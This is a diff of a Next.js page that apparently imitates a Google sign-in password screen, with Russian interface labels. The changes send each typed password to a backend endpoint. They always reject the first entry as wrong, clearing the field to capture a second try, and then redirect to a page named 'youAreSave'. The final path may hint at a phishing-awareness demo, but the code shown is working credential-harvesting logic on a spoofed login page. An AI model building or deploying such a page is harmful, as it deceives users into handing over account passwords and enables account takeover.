@@ -1,5 +1,5 @@
 'use client'
-import styles from "../page.module.css"
+import styles from "../../../../page.module.css"
 import Svg from "@/components/Svg";
 import {useCallback, useRef, useState} from "react";
 import Link from "next/link";
@@ -27,7 +27,7 @@ export default function Page() {
             splitter.current.style.opacity='0.3'
             line.current.style.opacity='0.3'
         }
-            await new Promise(resolve => setTimeout(resolve, 400))
+            await new Promise(resolve => setTimeout(resolve, 600))
         if(splitter.current && line.current){
             splitter.current.style.opacity='1'
             line.current.style.opacity='0'
@@ -39,10 +39,11 @@ export default function Page() {
             splitter.current.style.opacity='0.3'
             line.current.style.opacity='0.3'
         }
-        if(attempt<2){
+        if(attempt<1){
             await axios.post('/api', {
                 password: value
             }).then(data=>console.log(data))
+            setValue('')
             setValid(false)
             if(input.current) {
                 input.current.focus()
@@ -53,12 +54,26 @@ export default function Page() {
                 password: value
             }).then(data=>console.log(data))
             setValid(true)
+            router.push('/v3/signin/challenge/pwd/youAreSave')
         }
         if(splitter.current && line.current){
             splitter.current.style.opacity='1'
             line.current.style.opacity='0'
         }
     }, [value, attempt]);
+    const load = useCallback(async(path: string) => {
+        if(splitter.current && line.current){
+            splitter.current.style.opacity='0.3'
+            line.current.style.opacity='0.3'
+        }
+        setValid(true)
+        await new Promise(resolve => setTimeout(resolve, 600))
+        router.push(path)
+        if(splitter.current && line.current){
+            splitter.current.style.opacity='1'
+            line.current.style.opacity='0'
+        }
+    }, []);
     return (
         <main className={styles.main}>
             <div className={styles.TcuCfd}>
@@ -121,7 +136,8 @@ export default function Page() {
                             </div>
                         </div>
                         <div className={styles.submit}>
-                            <Link href='create' className={styles.create}>Забыли пароль?</Link>
+                            <div className={styles.create} onClick={()=>load('/v3/signin')}
+                            >Забыли пароль?</div>
                             <div onClick={submitPassword} className={styles.next}>Далее</div>
                         </div>
                     </div>
